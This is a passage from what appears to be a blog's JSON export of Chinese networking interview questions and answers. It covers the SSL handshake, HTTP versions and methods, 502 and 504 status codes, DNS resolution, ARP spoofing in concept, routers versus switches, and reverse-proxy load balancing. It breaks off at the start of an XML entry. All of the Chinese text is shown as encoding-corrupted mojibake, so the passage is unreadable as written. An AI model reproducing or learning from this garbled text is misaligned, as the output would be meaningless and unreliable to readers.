è¯´æ˜ä¸€ä¸‹ï¼ŒSSLå››æ¬¡æ¡æ‰‹çš„è¿‡ç¨‹1ã€ å®¢æˆ·ç«¯å‘å‡ºè¯·æ±‚ é¦–å…ˆï¼Œå®¢æˆ·ç«¯ï¼ˆé€šå¸¸æ˜¯æµè§ˆå™¨ï¼‰å…ˆå‘æœåŠ¡å™¨å‘å‡ºåŠ å¯†é€šä¿¡çš„è¯·æ±‚ï¼Œè¿™è¢«å«åšClientHelloè¯·æ±‚ã€‚ 2ã€æœåŠ¡å™¨å›åº” æœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯è¯·æ±‚åï¼Œå‘å®¢æˆ·ç«¯å‘å‡ºå›åº”ï¼Œè¿™å«åšSeverHelloã€‚ 3ã€å®¢æˆ·ç«¯å›åº” å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨å›åº”ä»¥åï¼Œé¦–å…ˆéªŒè¯æœåŠ¡å™¨è¯ä¹¦ã€‚å¦‚æœè¯ä¹¦ä¸æ˜¯å¯ä¿¡æœºæ„é¢å¸ƒã€æˆ–è€…è¯ä¹¦ä¸­çš„åŸŸåä¸å®é™…åŸŸåä¸ä¸€è‡´ã€æˆ–è€…è¯ä¹¦å·²ç»è¿‡æœŸï¼Œå°±ä¼šå‘è®¿é—®è€…æ˜¾ç¤ºä¸€ä¸ªè­¦å‘Šï¼Œç”±å…¶é€‰æ‹©æ˜¯å¦è¿˜è¦ç»§ç»­é€šä¿¡ã€‚ 4ã€æœåŠ¡å™¨çš„æœ€åå›åº” æœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯çš„ç¬¬ä¸‰ä¸ªéšæœºæ•°pre-master keyä¹‹åï¼Œè®¡ç®—ç”Ÿæˆæœ¬æ¬¡ä¼šè¯æ‰€ç”¨çš„â€ä¼šè¯å¯†é’¥â€ã€‚ç„¶åï¼Œå‘å®¢æˆ·ç«¯æœ€åå‘é€ä¸‹é¢ä¿¡æ¯ã€‚ ï¼ˆ1ï¼‰ç¼–ç æ”¹å˜é€šçŸ¥ï¼Œè¡¨ç¤ºéšåçš„ä¿¡æ¯éƒ½å°†ç”¨åŒæ–¹å•†å®šçš„åŠ å¯†æ–¹æ³•å’Œå¯†é’¥å‘é€ã€‚ ï¼ˆ2ï¼‰æœåŠ¡å™¨æ¡æ‰‹ç»“æŸé€šçŸ¥ï¼Œè¡¨ç¤ºæœåŠ¡å™¨çš„æ¡æ‰‹é˜¶æ®µå·²ç»ç»“æŸã€‚è¿™ä¸€é¡¹åŒæ—¶ä¹Ÿæ˜¯å‰é¢å‘é€çš„æ‰€æœ‰å†…å®¹çš„hashå€¼ï¼Œç”¨æ¥ä¾›å®¢æˆ·ç«¯æ ¡éªŒã€‚ è‡³æ­¤ï¼Œæ•´ä¸ªæ¡æ‰‹é˜¶æ®µå…¨éƒ¨ç»“æŸã€‚æ¥ä¸‹æ¥ï¼Œå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨è¿›å…¥åŠ å¯†é€šä¿¡ï¼Œå°±å®Œå…¨æ˜¯ä½¿ç”¨æ™®é€šçš„HTTPåè®®ï¼Œåªä¸è¿‡ç”¨â€ä¼šè¯å¯†é’¥â€åŠ å¯†å†…å®¹ã€‚ è¯·ä½ è®²è®²http1.1å’Œ1.0çš„åŒºåˆ«ä¸»è¦åŒºåˆ«ä¸»è¦ä½“ç°åœ¨ï¼š ç¼“å­˜å¤„ç†ï¼Œåœ¨HTTP1.0ä¸­ä¸»è¦ä½¿ç”¨headeré‡Œçš„If-Modified-Since,Expiresæ¥åšä¸ºç¼“å­˜åˆ¤æ–­çš„æ ‡å‡†ï¼ŒHTTP1.1åˆ™å¼•å…¥äº†æ›´å¤šçš„ç¼“å­˜æ§åˆ¶ç­–ç•¥ä¾‹å¦‚Entity tagï¼ŒIf-Unmodified-Since, If-Match, If-None-Matchç­‰æ›´å¤šå¯ä¾›é€‰æ‹©çš„ç¼“å­˜å¤´æ¥æ§åˆ¶ç¼“å­˜ç­–ç•¥ã€‚ å¸¦å®½ä¼˜åŒ–åŠç½‘ç»œè¿æ¥çš„ä½¿ç”¨ï¼ŒHTTP1.0ä¸­ï¼Œå­˜åœ¨ä¸€äº›æµªè´¹å¸¦å®½çš„ç°è±¡ï¼Œä¾‹å¦‚å®¢æˆ·ç«¯åªæ˜¯éœ€è¦æŸä¸ªå¯¹è±¡çš„ä¸€éƒ¨åˆ†ï¼Œè€ŒæœåŠ¡å™¨å´å°†æ•´ä¸ªå¯¹è±¡é€è¿‡æ¥äº†ï¼Œå¹¶ä¸”ä¸æ”¯æŒæ–­ç‚¹ç»­ä¼ åŠŸèƒ½ï¼ŒHTTP1.1åˆ™åœ¨è¯·æ±‚å¤´å¼•å…¥äº†rangeå¤´åŸŸï¼Œå®ƒå…è®¸åªè¯·æ±‚èµ„æºçš„æŸä¸ªéƒ¨åˆ†ï¼Œå³è¿”å›ç æ˜¯206ï¼ˆPartial Contentï¼‰ï¼Œè¿™æ ·å°±æ–¹ä¾¿äº†å¼€å‘è€…è‡ªç”±çš„é€‰æ‹©ä»¥ä¾¿äºå……åˆ†åˆ©ç”¨å¸¦å®½å’Œè¿æ¥ã€‚ é”™è¯¯é€šçŸ¥çš„ç®¡ç†ï¼Œåœ¨HTTP1.1ä¸­æ–°å¢äº†24ä¸ªé”™è¯¯çŠ¶æ€å“åº”ç ï¼Œå¦‚409ï¼ˆConflictï¼‰è¡¨ç¤ºè¯·æ±‚çš„èµ„æºä¸èµ„æºçš„å½“å‰çŠ¶æ€å‘ç”Ÿå†²çªï¼›410ï¼ˆGoneï¼‰è¡¨ç¤ºæœåŠ¡å™¨ä¸Šçš„æŸä¸ªèµ„æºè¢«æ°¸ä¹…æ€§çš„åˆ é™¤ã€‚ Hostå¤´å¤„ç†ï¼Œåœ¨HTTP1.0ä¸­è®¤ä¸ºæ¯å°æœåŠ¡å™¨éƒ½ç»‘å®šä¸€ä¸ªå”¯ä¸€çš„IPåœ°å€ï¼Œå› æ­¤ï¼Œè¯·æ±‚æ¶ˆæ¯ä¸­çš„URLå¹¶æ²¡æœ‰ä¼ é€’ä¸»æœºåï¼ˆhostnameï¼‰ã€‚ä½†éšç€è™šæ‹Ÿä¸»æœºæŠ€æœ¯çš„å‘å±•ï¼Œåœ¨ä¸€å°ç‰©ç†æœåŠ¡å™¨ä¸Šå¯ä»¥å­˜åœ¨å¤šä¸ªè™šæ‹Ÿä¸»æœºï¼ˆMulti-homed Web Serversï¼‰ï¼Œå¹¶ä¸”å®ƒä»¬å…±äº«ä¸€ä¸ªIPåœ°å€ã€‚HTTP1.1çš„è¯·æ±‚æ¶ˆæ¯å’Œå“åº”æ¶ˆæ¯éƒ½åº”æ”¯æŒHostå¤´åŸŸï¼Œä¸”è¯·æ±‚æ¶ˆæ¯ä¸­å¦‚æœæ²¡æœ‰Hostå¤´åŸŸä¼šæŠ¥å‘Šä¸€ä¸ªé”™è¯¯ï¼ˆ400 Bad Requestï¼‰ã€‚ é•¿è¿æ¥ï¼ŒHTTP 1.1æ”¯æŒé•¿è¿æ¥ï¼ˆPersistentConnectionï¼‰å’Œè¯·æ±‚çš„æµæ°´çº¿ï¼ˆPipeliningï¼‰å¤„ç†ï¼Œåœ¨ä¸€ä¸ªTCPè¿æ¥ä¸Šå¯ä»¥ä¼ é€å¤šä¸ªHTTPè¯·æ±‚å’Œå“åº”ï¼Œå‡å°‘äº†å»ºç«‹å’Œå…³é—­è¿æ¥çš„æ¶ˆè€—å’Œå»¶è¿Ÿï¼Œåœ¨HTTP1.1ä¸­é»˜è®¤å¼€å¯Connectionï¼š keep-aliveï¼Œä¸€å®šç¨‹åº¦ä¸Šå¼¥è¡¥äº†HTTP1.0æ¯æ¬¡è¯·æ±‚éƒ½è¦åˆ›å»ºè¿æ¥çš„ç¼ºç‚¹ã€‚ è¯·è°ˆä¸€ä¸‹ï¼Œä½ çŸ¥é“çš„httpè¯·æ±‚ï¼Œå¹¶è¯´æ˜åº”ç­”ç 502å’Œ504çš„åŒºåˆ«OPTIONSï¼šè¿”å›æœåŠ¡å™¨é’ˆå¯¹ç‰¹å®šèµ„æºæ‰€æ”¯æŒçš„HTTPè¯·æ±‚æ–¹æ³•ã€‚ä¹Ÿå¯ä»¥åˆ©ç”¨å‘WebæœåŠ¡å™¨å‘é€â€™*â€™çš„è¯·æ±‚æ¥æµ‹è¯•æœåŠ¡å™¨çš„åŠŸèƒ½æ€§ã€‚ HEADï¼šå‘æœåŠ¡å™¨ç´¢è¦ä¸GETè¯·æ±‚ç›¸ä¸€è‡´çš„å“åº”ï¼Œåªä¸è¿‡å“åº”ä½“å°†ä¸ä¼šè¢«è¿”å›ã€‚è¿™ä¸€æ–¹æ³•å¯ä»¥åœ¨ä¸å¿…ä¼ è¾“æ•´ä¸ªå“åº”å†…å®¹çš„æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥è·å–åŒ…å«åœ¨å“åº”æ¶ˆæ¯å¤´ä¸­çš„å…ƒä¿¡æ¯ã€‚ GETï¼šå‘ç‰¹å®šçš„èµ„æºå‘å‡ºè¯·æ±‚ã€‚ POSTï¼šå‘æŒ‡å®šèµ„æºæäº¤æ•°æ®è¿›è¡Œå¤„ç†è¯·æ±‚ï¼ˆä¾‹å¦‚æäº¤è¡¨å•æˆ–è€…ä¸Šä¼ æ–‡ä»¶ï¼‰ã€‚æ•°æ®è¢«åŒ…å«åœ¨è¯·æ±‚ä½“ä¸­ã€‚POSTè¯·æ±‚å¯èƒ½ä¼šå¯¼è‡´æ–°çš„èµ„æºçš„åˆ›å»ºå’Œ/æˆ–å·²æœ‰èµ„æºçš„ä¿®æ”¹ã€‚ PUTï¼šå‘æŒ‡å®šèµ„æºä½ç½®ä¸Šä¼ å…¶æœ€æ–°å†…å®¹ã€‚ DELETEï¼šè¯·æ±‚æœåŠ¡å™¨åˆ é™¤Request-URIæ‰€æ ‡è¯†çš„èµ„æºã€‚ TRACEï¼šå›æ˜¾æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ï¼Œä¸»è¦ç”¨äºæµ‹è¯•æˆ–è¯Šæ–­ã€‚ CONNECTï¼šHTTP/1.1åè®®ä¸­é¢„ç•™ç»™èƒ½å¤Ÿå°†è¿æ¥æ”¹ä¸ºç®¡é“æ–¹å¼çš„ä»£ç†æœåŠ¡å™¨ã€‚ è™½ç„¶HTTPçš„è¯·æ±‚æ–¹å¼æœ‰8ç§ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨å®é™…åº”ç”¨ä¸­å¸¸ç”¨çš„ä¹Ÿå°±æ˜¯getå’Œpostï¼Œå…¶ä»–è¯·æ±‚æ–¹å¼ä¹Ÿéƒ½å¯ä»¥é€šè¿‡è¿™ä¸¤ç§æ–¹å¼é—´æ¥çš„æ¥å®ç°ã€‚ 502ï¼šä½œä¸ºç½‘å…³æˆ–è€…ä»£ç†å·¥ä½œçš„æœåŠ¡å™¨å°è¯•æ‰§è¡Œè¯·æ±‚æ—¶ï¼Œä»ä¸Šæ¸¸æœåŠ¡å™¨æ¥æ”¶åˆ°æ— æ•ˆçš„å“åº”ã€‚ 504ï¼šä½œä¸ºç½‘å…³æˆ–è€…ä»£ç†å·¥ä½œçš„æœåŠ¡å™¨å°è¯•æ‰§è¡Œè¯·æ±‚æ—¶ï¼Œæœªèƒ½åŠæ—¶ä»ä¸Šæ¸¸æœåŠ¡å™¨ï¼ˆURIæ ‡è¯†å‡ºçš„æœåŠ¡å™¨ï¼Œä¾‹å¦‚HTTPã€FTPã€LDAPï¼‰æˆ–è€…è¾…åŠ©æœåŠ¡å™¨ï¼ˆä¾‹å¦‚DNSï¼‰æ”¶åˆ°å“åº”ã€‚ httpå’Œhttpsçš„åŒºåˆ« httpsåè®®è¦ç”³è¯·è¯ä¹¦åˆ°caï¼Œéœ€è¦ä¸€å®šç»æµæˆæœ¬ï¼›2ï¼‰ httpæ˜¯æ˜æ–‡ä¼ è¾“ï¼Œhttpsæ˜¯åŠ å¯†çš„å®‰å…¨ä¼ è¾“ï¼›3ï¼‰ è¿æ¥çš„ç«¯å£ä¸ä¸€æ ·ï¼Œhttpæ˜¯80ï¼Œhttpsæ˜¯443ï¼›4ï¼‰httpè¿æ¥å¾ˆç®€å•ï¼Œæ²¡æœ‰çŠ¶æ€ï¼›httpsæ˜¯sslåŠ å¯†çš„ä¼ è¾“ï¼Œèº«ä»½è®¤è¯çš„ç½‘ç»œåè®®ï¼Œç›¸å¯¹httpä¼ è¾“æ¯”è¾ƒå®‰å…¨ã€‚ è¯·è®²ä¸€ä¸‹æµè§ˆå™¨ä»æ¥æ”¶åˆ°ä¸€ä¸ªURLï¼Œåˆ°æœ€åå±•ç¤ºå‡ºé¡µé¢ï¼Œç»å†äº†å“ªäº›è¿‡ç¨‹ã€‚1.DNSè§£æ 2.TCPè¿æ¥ 3.å‘é€HTTPè¯·æ±‚ 4.æœåŠ¡å™¨å¤„ç†è¯·æ±‚å¹¶è¿”å›HTTPæŠ¥æ–‡ 5.æµè§ˆå™¨è§£ææ¸²æŸ“é¡µé¢ ç½‘ç»œå±‚è¯·ç®€å•è§£é‡Šä¸€ä¸‹ï¼Œarpåè®®å’Œarpæ”»å‡»ã€‚åœ°å€è§£æåè®®ã€‚ARPæ”»å‡»çš„ç¬¬ä¸€æ­¥å°±æ˜¯ARPæ¬ºéª—ã€‚ç”±ä¸Šè¿°â€œARPåè®®çš„å·¥ä½œè¿‡ç¨‹â€æˆ‘ä»¬çŸ¥é“ï¼ŒARPåè®®åŸºæœ¬æ²¡æœ‰å¯¹ç½‘ç»œçš„å®‰å…¨æ€§åšä»»ä½•æ€è€ƒï¼Œå½“æ—¶äººä»¬è€ƒè™‘çš„é‡ç‚¹æ˜¯å¦‚ä½•ä¿è¯ç½‘ç»œé€šä¿¡èƒ½å¤Ÿæ­£ç¡®å’Œå¿«é€Ÿçš„å®Œæˆâ€”â€”ARPåè®®å·¥ä½œçš„å‰ææ˜¯é»˜è®¤äº†å…¶æ‰€åœ¨çš„ç½‘ç»œæ˜¯ä¸€ä¸ªå–„è‰¯çš„ç½‘ç»œï¼Œæ¯å°ä¸»æœºåœ¨å‘ç½‘ç»œä¸­å‘é€åº”ç­”ä¿¡å·æ—¶éƒ½æ˜¯ä½¿ç”¨çš„çœŸå®èº«ä»½ã€‚ä¸è¿‡åæ¥ï¼Œäººä»¬å‘ç°ARPåº”ç­”ä¸­çš„IPåœ°å€å’ŒMACåœ°å€ä¸­çš„ä¿¡æ¯æ˜¯å¯ä»¥ä¼ªé€ çš„ï¼Œå¹¶ä¸ä¸€å®šæ˜¯è‡ªå·±çš„çœŸå®IPåœ°å€å’ŒMACåœ°å€ï¼Œç”±æ­¤ï¼ŒARPæ¬ºéª—å°±äº§ç”Ÿäº†ã€‚ ä»€ä¹ˆæ˜¯icmpåè®®ï¼Œå®ƒçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿå®ƒæ˜¯TCP/IPåè®®æ—çš„ä¸€ä¸ªå­åè®®ï¼Œç”¨äºåœ¨IPä¸»æœºã€è·¯ç”±å™¨ä¹‹é—´ä¼ é€’æ§åˆ¶æ¶ˆæ¯ã€‚æ§åˆ¶æ¶ˆæ¯æ˜¯æŒ‡ç½‘ç»œé€šä¸é€šã€ä¸»æœºæ˜¯å¦å¯è¾¾ã€è·¯ç”±æ˜¯å¦å¯ç”¨ç­‰ç½‘ç»œæœ¬èº«çš„æ¶ˆæ¯ã€‚è¿™äº›æ§åˆ¶æ¶ˆæ¯è™½ç„¶å¹¶ä¸ä¼ è¾“ç”¨æˆ·æ•°æ®ï¼Œä½†æ˜¯å¯¹äºç”¨æˆ·æ•°æ®çš„ä¼ é€’èµ·ç€é‡è¦çš„ä½œç”¨ã€‚ è¯·ä½ è®²ä¸€ä¸‹è·¯ç”±å™¨å’Œäº¤æ¢æœºçš„åŒºåˆ«ï¼Ÿäº¤æ¢æœºç”¨äºåŒä¸€ç½‘ç»œå†…éƒ¨æ•°æ®çš„å¿«é€Ÿä¼ è¾“è½¬å‘å†³ç­–é€šè¿‡æŸ¥çœ‹äºŒå±‚å¤´éƒ¨å®Œæˆè½¬å‘ä¸éœ€è¦ä¿®æ”¹æ•°æ®å¸§å·¥ä½œåœ¨ TCP/IP åè®®çš„äºŒå±‚ â€”â€” æ•°æ®é“¾è·¯å±‚å·¥ä½œç®€å•ï¼Œç›´æ¥ä½¿ç”¨ç¡¬ä»¶å¤„ç†è·¯ç”±å™¨ç”¨äºä¸åŒç½‘ç»œé—´æ•°æ®çš„è·¨ç½‘ç»œä¼ è¾“è½¬å‘å†³ç­–é€šè¿‡æŸ¥çœ‹ä¸‰å±‚å¤´éƒ¨å®Œæˆè½¬å‘éœ€è¦ä¿®æ”¹ TTL ï¼ŒIP å¤´éƒ¨æ ¡éªŒå’Œéœ€è¦é‡æ–°è®¡ç®—ï¼Œæ•°æ®å¸§éœ€è¦é‡æ–°å°è£…å·¥ä½œåœ¨ TCP/IP åè®®çš„ä¸‰å±‚ â€”â€” ç½‘ç»œå±‚å·¥ä½œå¤æ‚ï¼Œä½¿ç”¨è½¯ä»¶å¤„ç†ã€‚ è¯·ä½ è°ˆè°ˆDNSçš„å¯»å€è¿‡ç¨‹ã€‚1ã€åœ¨æµè§ˆå™¨ä¸­è¾“å…¥www.qq.comåŸŸåï¼Œæ“ä½œç³»ç»Ÿä¼šå…ˆæ£€æŸ¥è‡ªå·±æœ¬åœ°çš„hostsæ–‡ä»¶æ˜¯å¦æœ‰è¿™ä¸ªç½‘å€æ˜ å°„å…³ç³»ï¼Œå¦‚æœæœ‰ï¼Œå°±å…ˆè°ƒç”¨è¿™ä¸ªIPåœ°å€æ˜ å°„ï¼Œå®ŒæˆåŸŸåè§£æã€‚ 2ã€å¦‚æœhostsé‡Œæ²¡æœ‰è¿™ä¸ªåŸŸåçš„æ˜ å°„ï¼Œåˆ™æŸ¥æ‰¾æœ¬åœ°DNSè§£æå™¨ç¼“å­˜ï¼Œæ˜¯å¦æœ‰è¿™ä¸ªç½‘å€æ˜ å°„å…³ç³»ï¼Œå¦‚æœæœ‰ï¼Œç›´æ¥è¿”å›ï¼Œå®ŒæˆåŸŸåè§£æã€‚ 3ã€å¦‚æœhostsä¸æœ¬åœ°DNSè§£æå™¨ç¼“å­˜éƒ½æ²¡æœ‰ç›¸åº”çš„ç½‘å€æ˜ å°„å…³ç³»ï¼Œé¦–å…ˆä¼šæ‰¾TCP/ipå‚æ•°ä¸­è®¾ç½®çš„é¦–é€‰DNSæœåŠ¡å™¨ï¼Œåœ¨æ­¤æˆ‘ä»¬å«å®ƒæœ¬åœ°DNSæœåŠ¡å™¨ï¼Œæ­¤æœåŠ¡å™¨æ”¶åˆ°æŸ¥è¯¢æ—¶ï¼Œå¦‚æœè¦æŸ¥è¯¢çš„åŸŸåï¼ŒåŒ…å«åœ¨æœ¬åœ°é…ç½®åŒºåŸŸèµ„æºä¸­ï¼Œåˆ™è¿”å›è§£æç»“æœç»™å®¢æˆ·æœºï¼Œå®ŒæˆåŸŸåè§£æï¼Œæ­¤è§£æå…·æœ‰æƒå¨æ€§ã€‚ 4ã€å¦‚æœè¦æŸ¥è¯¢çš„åŸŸåï¼Œä¸ç”±æœ¬åœ°DNSæœåŠ¡å™¨åŒºåŸŸè§£æï¼Œä½†è¯¥æœåŠ¡å™¨å·²ç¼“å­˜äº†æ­¤ç½‘å€æ˜ å°„å…³ç³»ï¼Œåˆ™è°ƒç”¨è¿™ä¸ªIPåœ°å€æ˜ å°„ï¼Œå®ŒæˆåŸŸåè§£æï¼Œæ­¤è§£æä¸å…·æœ‰æƒå¨æ€§ã€‚ 5ã€å¦‚æœæœ¬åœ°DNSæœåŠ¡å™¨æœ¬åœ°åŒºåŸŸæ–‡ä»¶ä¸ç¼“å­˜è§£æéƒ½å¤±æ•ˆï¼Œåˆ™æ ¹æ®æœ¬åœ°DNSæœåŠ¡å™¨çš„è®¾ç½®ï¼ˆæ˜¯å¦è®¾ç½®è½¬å‘å™¨ï¼‰è¿›è¡ŒæŸ¥è¯¢ï¼Œå¦‚æœæœªç”¨è½¬å‘æ¨¡å¼ï¼Œæœ¬åœ°DNSå°±æŠŠè¯·æ±‚å‘è‡³13å°æ ¹DNSï¼Œæ ¹DNSæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åä¼šåˆ¤æ–­è¿™ä¸ªåŸŸå(.com)æ˜¯è°æ¥æˆæƒç®¡ç†ï¼Œå¹¶ä¼šè¿”å›ä¸€ä¸ªè´Ÿè´£è¯¥é¡¶çº§åŸŸåæœåŠ¡å™¨çš„ä¸€ä¸ªIPã€‚æœ¬åœ°DNSæœåŠ¡å™¨æ”¶åˆ°IPä¿¡æ¯åï¼Œå°†ä¼šè”ç³»è´Ÿè´£.comåŸŸçš„è¿™å°æœåŠ¡å™¨ã€‚è¿™å°è´Ÿè´£.comåŸŸçš„æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œå¦‚æœè‡ªå·±æ— æ³•è§£æï¼Œå®ƒå°±ä¼šæ‰¾ä¸€ä¸ªç®¡ç†.comåŸŸçš„ä¸‹ä¸€çº§DNSæœåŠ¡å™¨åœ°å€(qq.com)ç»™æœ¬åœ°DNSæœåŠ¡å™¨ã€‚å½“æœ¬åœ°DNSæœåŠ¡å™¨æ”¶åˆ°è¿™ä¸ªåœ°å€åï¼Œå°±ä¼šæ‰¾qq.comåŸŸæœåŠ¡å™¨ï¼Œé‡å¤ä¸Šé¢çš„åŠ¨ä½œï¼Œè¿›è¡ŒæŸ¥è¯¢ï¼Œç›´è‡³æ‰¾åˆ°www.qq.comä¸»æœºã€‚ 6ã€å¦‚æœç”¨çš„æ˜¯è½¬å‘æ¨¡å¼ï¼Œæ­¤DNSæœåŠ¡å™¨å°±ä¼šæŠŠè¯·æ±‚è½¬å‘è‡³ä¸Šä¸€çº§DNSæœåŠ¡å™¨ï¼Œç”±ä¸Šä¸€çº§æœåŠ¡å™¨è¿›è¡Œè§£æï¼Œä¸Šä¸€çº§æœåŠ¡å™¨å¦‚æœä¸èƒ½è§£æï¼Œæˆ–æ‰¾æ ¹DNSæˆ–æŠŠè½¬è¯·æ±‚è½¬è‡³ä¸Šä¸Šçº§ï¼Œä»¥æ­¤å¾ªç¯ã€‚ä¸ç®¡æ˜¯æœ¬åœ°DNSæœåŠ¡å™¨ç”¨æ˜¯æ˜¯è½¬å‘ï¼Œè¿˜æ˜¯æ ¹æç¤ºï¼Œæœ€åéƒ½æ˜¯æŠŠç»“æœè¿”å›ç»™æœ¬åœ°DNSæœåŠ¡å™¨ï¼Œç”±æ­¤DNSæœåŠ¡å™¨å†è¿”å›ç»™å®¢æˆ·æœºã€‚ ä»å®¢æˆ·ç«¯åˆ°æœ¬åœ°DNSæœåŠ¡å™¨æ˜¯å±äºé€’å½’æŸ¥è¯¢ï¼Œè€ŒDNSæœåŠ¡å™¨ä¹‹é—´å°±æ˜¯çš„äº¤äº’æŸ¥è¯¢å°±æ˜¯è¿­ä»£æŸ¥è¯¢ã€‚ è¯·ä½ ç®€å•è®²è§£ä¸€ä¸‹ï¼Œè´Ÿè½½å‡è¡¡ åå‘ä»£ç†æ¨¡å¼çš„ä¼˜ç‚¹ã€ç¼ºç‚¹ï¼ˆ1ï¼‰åå‘ä»£ç†ï¼ˆReverse Proxyï¼‰æ–¹å¼æ˜¯æŒ‡ä»¥ä»£ç†æœåŠ¡å™¨æ¥æ¥å—internetä¸Šçš„è¿æ¥è¯·æ±‚ï¼Œç„¶åå°†è¯·æ±‚è½¬å‘ç»™å†…éƒ¨ç½‘ç»œä¸Šçš„æœåŠ¡å™¨ï¼Œå¹¶å°†ä»æœåŠ¡å™¨ä¸Šå¾—åˆ°çš„ç»“æœè¿”å›ç»™internetä¸Šè¯·æ±‚è¿æ¥çš„å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶ä»£ç†æœåŠ¡å™¨å¯¹å¤–å°±è¡¨ç°ä¸ºä¸€ä¸ªæœåŠ¡å™¨ã€‚ ï¼ˆ2ï¼‰åå‘ä»£ç†è´Ÿè½½å‡è¡¡æŠ€æœ¯æ˜¯æŠŠå°†æ¥è‡ªinternetä¸Šçš„è¿æ¥è¯·æ±‚ä»¥åå‘ä»£ç†çš„æ–¹å¼åŠ¨æ€åœ°è½¬å‘ç»™å†…éƒ¨ç½‘ç»œä¸Šçš„å¤šå°æœåŠ¡å™¨è¿›è¡Œå¤„ç†ï¼Œä»è€Œè¾¾åˆ°è´Ÿè½½å‡è¡¡çš„ç›®çš„ã€‚ ï¼ˆ3ï¼‰åå‘ä»£ç†è´Ÿè½½å‡è¡¡èƒ½ä»¥è½¯ä»¶æ–¹å¼æ¥å®ç°ï¼Œå¦‚apache mod_proxyã€netscape proxyç­‰ï¼Œä¹Ÿå¯ä»¥åœ¨é«˜é€Ÿç¼“å­˜å™¨ã€è´Ÿè½½å‡è¡¡å™¨ç­‰ç¡¬ä»¶è®¾å¤‡ä¸Šå®ç°ã€‚åå‘ä»£ç†è´Ÿè½½å‡è¡¡å¯ä»¥å°†ä¼˜åŒ–çš„è´Ÿè½½å‡è¡¡ç­–ç•¥å’Œä»£ç†æœåŠ¡å™¨çš„é«˜é€Ÿç¼“å­˜æŠ€æœ¯ç»“åˆåœ¨ä¸€èµ·ï¼Œæå‡é™æ€ç½‘é¡µçš„è®¿é—®é€Ÿåº¦ï¼Œæä¾›æœ‰ç›Šçš„æ€§èƒ½ï¼›ç”±äºç½‘ç»œå¤–éƒ¨ç”¨æˆ·ä¸èƒ½ç›´æ¥è®¿é—®çœŸå®çš„æœåŠ¡å™¨ï¼Œå…·å¤‡é¢å¤–çš„å®‰å…¨æ€§ï¼ˆåŒç†ï¼ŒNATè´Ÿè½½å‡è¡¡æŠ€æœ¯ä¹Ÿæœ‰æ­¤ä¼˜ç‚¹ï¼‰ã€‚ ï¼ˆ4ï¼‰å…¶ç¼ºç‚¹ä¸»è¦è¡¨ç°åœ¨ä»¥ä¸‹ä¸¤ä¸ªæ–¹é¢ åå‘ä»£ç†æ˜¯å¤„äºOSIå‚è€ƒæ¨¡å‹ç¬¬ä¸ƒå±‚åº”ç”¨çš„ï¼Œæ‰€ä»¥å°±å¿…é¡»ä¸ºæ¯ä¸€ç§åº”ç”¨æœåŠ¡ä¸“é—¨å¼€å‘ä¸€ä¸ªåå‘ä»£ç†æœåŠ¡å™¨ï¼Œè¿™æ ·å°±é™åˆ¶äº†åå‘ä»£ç†è´Ÿè½½å‡è¡¡æŠ€æœ¯çš„åº”ç”¨èŒƒå›´ï¼Œç°åœ¨ä¸€èˆ¬éƒ½ç”¨äºå¯¹webæœåŠ¡å™¨çš„è´Ÿè½½å‡è¡¡ã€‚ é’ˆå¯¹æ¯ä¸€æ¬¡ä»£ç†ï¼Œä»£ç†æœåŠ¡å™¨å°±å¿…é¡»æ‰“å¼€ä¸¤ä¸ªè¿æ¥ï¼Œä¸€ä¸ªå¯¹å¤–ï¼Œä¸€ä¸ªå¯¹å†…ï¼Œå› æ­¤åœ¨å¹¶å‘è¿æ¥è¯·æ±‚æ•°é‡éå¸¸å¤§çš„æ—¶å€™ï¼Œä»£ç†æœåŠ¡å™¨çš„è´Ÿè½½ä¹Ÿå°±éå¸¸å¤§äº†ï¼Œåœ¨æœ€åä»£ç†æœåŠ¡å™¨æœ¬èº«ä¼šæˆä¸ºæœåŠ¡çš„ç“¶é¢ˆã€‚ ä¸€èˆ¬æ¥è®²ï¼Œå¯ä»¥ç”¨å®ƒæ¥å¯¹è¿æ¥æ•°é‡ä¸æ˜¯ç‰¹åˆ«å¤§ï¼Œä½†æ¯æ¬¡è¿æ¥éƒ½éœ€è¦æ¶ˆè€—å¤§é‡å¤„ç†èµ„æºçš„ç«™ç‚¹è¿›è¡Œè´Ÿè½½å‡è¡¡ï¼Œå¦‚searchç­‰ã€‚","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://blog.kayleh.top/tags/Interview/"}]},{"title":"XML","slug":"XML","date":"2020-07-23T22:24:49.000Z","updated":"2021-04-11T17:11:28.473Z","comments":true,"path":"XML/","link":"","permalink":"https://blog.kayleh.top/XML/","excerpt":"XML","text":"XML è¯·ä»‹ç»ä¸€ä¸‹ï¼ŒXMLæ–‡æ¡£å®šä¹‰çš„å‡ ç§å½¢å¼ï¼Œå®ƒä»¬ä¹‹é—´æœ‰ä½•æœ¬è´¨åŒºåˆ«ï¼Ÿå†è¯´è¯´ï¼Œè§£æXMLæ–‡æ¡£åˆæœ‰å“ªå‡ ç§æ–¹å¼ï¼Ÿa: ä¸¤ç§å½¢å¼ dtd schemab: æœ¬è´¨åŒºåˆ«:schemaæœ¬èº«æ˜¯xmlçš„ï¼Œå¯ä»¥è¢«XMLè§£æå™¨è§£æ(è¿™ä¹Ÿæ˜¯ä»DTDä¸Šå‘å±•schemaçš„æ ¹æœ¬ç›®çš„)c:æœ‰DOM,SAX,STAXç­‰DOM:å¤„ç†å¤§å‹æ–‡ä»¶æ—¶å…¶æ€§èƒ½ä¸‹é™çš„éå¸¸å‰å®³ã€‚è¿™ä¸ªé—®é¢˜æ˜¯ç”±DOMçš„æ ‘ç»“æ„æ‰€é€ æˆçš„ï¼Œè¿™ç§ç»“æ„å 